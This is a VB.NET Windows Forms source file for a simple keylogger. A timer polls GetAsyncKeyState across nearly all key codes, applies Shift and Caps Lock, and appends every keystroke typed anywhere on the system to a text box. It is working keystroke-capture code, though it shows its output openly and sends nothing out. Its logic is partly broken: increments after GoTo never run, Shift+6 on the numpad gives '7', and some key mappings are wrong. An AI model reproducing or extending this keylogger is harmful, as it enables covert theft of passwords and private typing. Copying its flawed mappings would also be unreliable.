Public Class Form1
    Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Int32) As Int16
    Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Integer) As Short
    Dim keyPressed As Object
    Dim charCount As Int32
    Dim lineLimit As Int32 = 6923
    Dim addKey As Object
    Dim Stored As String
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub
    Public Function getCapslock() As Boolean
        getCapslock = CBool(GetKeyState(System.Windows.Forms.Keys.Capital) And 1)
    End Function
    Public Function getShift() As Boolean
        getShift = CBool(GetAsyncKeyState(System.Windows.Forms.Keys.ShiftKey))
    End Function
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick

        On Error Resume Next

        'F2
        keyPressed = GetAsyncKeyState(113)
        If keyPressed = -32767 Then
            charCount = 0
            addKey = ""
            GoTo KeyFound
        End If
        'F10

        keyPressed = GetAsyncKeyState(121)
        If keyPressed = -32767 Then
            charCount = 0
            addKey = ""
            GoTo KeyFound
        End If

        'check Enter key
        keyPressed = GetAsyncKeyState(13)
        If keyPressed = -32767 Then
            charCount = 0
            addKey = vbCrLf
            GoTo KeyFound
        End If

        'check for backspace
        keyPressed = GetAsyncKeyState(8)
        If keyPressed = -32767 Then
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.Length - 1)
            charCount += 4

        End If

        'check for space bar
        keyPressed = GetAsyncKeyState(32)
        If keyPressed = -32767 Then
            addKey = " "
            GoTo KeyFound
            charCount += 1
        End If

        'check for colon/semicolon
        keyPressed = GetAsyncKeyState(186)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = ";"
            Else
                addKey = ":"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for =/+
        keyPressed = GetAsyncKeyState(187)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "="
            Else
                addKey = "+"
            End If
            GoTo KeyFound
            charCount += 1
        End If



        'check for ,/<
        keyPressed = GetAsyncKeyState(188)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = ","
            Else
                addKey = "<"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for -/_
        keyPressed = GetAsyncKeyState(189)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "-"
            Else
                addKey = "_"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for ./>
        keyPressed = GetAsyncKeyState(190)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "."
            Else
                addKey = ">"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for //?
        keyPressed = GetAsyncKeyState(191)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "/"
            Else
                addKey = "?"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for `/~
        keyPressed = GetAsyncKeyState(192)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "`"
            Else
                addKey = "~"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 0/)
        keyPressed = GetAsyncKeyState(96)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "0"
            Else
                addKey = ")"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 1/!
        keyPressed = GetAsyncKeyState(97)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "1"
            Else
                addKey = "!"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 2/@
        keyPressed = GetAsyncKeyState(98)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "2"
            Else
                addKey = "@"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 3/#
        keyPressed = GetAsyncKeyState(99)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "3"
            Else
                addKey = "#"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 4/$
        keyPressed = GetAsyncKeyState(100)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "4"
            Else
                addKey = "$"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 5/%
        keyPressed = GetAsyncKeyState(101)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "5"
            Else
                addKey = "%"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 6/^
        keyPressed = GetAsyncKeyState(102)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "6"
            Else
                addKey = "7"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 7/&
        keyPressed = GetAsyncKeyState(103)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "7"
            Else
                addKey = "&"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 8/*
        keyPressed = GetAsyncKeyState(104)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "8"
            Else
                addKey = "*"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 9/(
        keyPressed = GetAsyncKeyState(105)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "9"
            Else
                addKey = "("
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'other num/special chars
        keyPressed = GetAsyncKeyState(106)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "*"
                charCount += 1
            Else
                addKey = ""
            End If
            GoTo KeyFound
        End If

        keyPressed = GetAsyncKeyState(107)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "+"
            Else
                addKey = "="
            End If
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(108)
        If keyPressed = -32767 Then
            addKey = ""
            GoTo KeyFound
        End If

        keyPressed = GetAsyncKeyState(109)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "-"
            Else
                addKey = "_"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(110)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "."
            Else
                addKey = ">"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(111)
        If keyPressed = -32767 Then
            addKey = "/"
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(2)
        If keyPressed = -32767 Then
            If getShift() = False Then
                '     addKey = "/"
            Else
                addKey = "?"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(220)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "\"
            Else
                addKey = "|"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(222)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "'"
            Else
                addKey = Chr(34)
            End If
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(221)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "]"
            Else
                addKey = "}"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(219)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "["
            Else
                addKey = "{"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for a-z upper and lower case
        For i = 65 To 128
            keyPressed = GetAsyncKeyState(i)
            If keyPressed = -32767 Then
                If getShift() = False Then
                    If getCapslock() = True Then
                        addKey = UCase(Chr(i))
                    Else
                        addKey = LCase(Chr(i))
                    End If
                Else
                    If getCapslock() = False Then
                        addKey = UCase(Chr(i))
                    Else
                        addKey = LCase(Chr(i))
                    End If
                End If
                GoTo KeyFound
                charCount += 1
            End If
        Next i

        For i = 48 To 57
            keyPressed = GetAsyncKeyState(i)
            If keyPressed = -32767 Then
                If getShift() = True Then
                    Select Case Val(Chr(i))
                        Case 1
                            addKey = "!"
                        Case 2
                            addKey = "@"
                        Case 3
                            addKey = "#"
                        Case 4
                            addKey = "$"
                        Case 5
                            addKey = "%"
                        Case 6
                            addKey = "^"
                        Case 7
                            addKey = "&"
                        Case 8
                            addKey = "*"
                        Case 9
                            addKey = "("
                        Case 0
                            addKey = ")"
                    End Select
                Else
                    addKey = Chr(i)
                End If
                GoTo KeyFound
                charCount += 1
            End If
        Next i

        System.Windows.Forms.Application.DoEvents()
        Exit Sub

        'keyfound
KeyFound:
        If charCount > lineLimit Then
            charCount = 0
            TextBox1.AppendText(vbCrLf)
        End If
        If addKey <> "" Then TextBox1.AppendText(addKey)
        System.Windows.Forms.Application.DoEvents()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

    End Sub
End Class
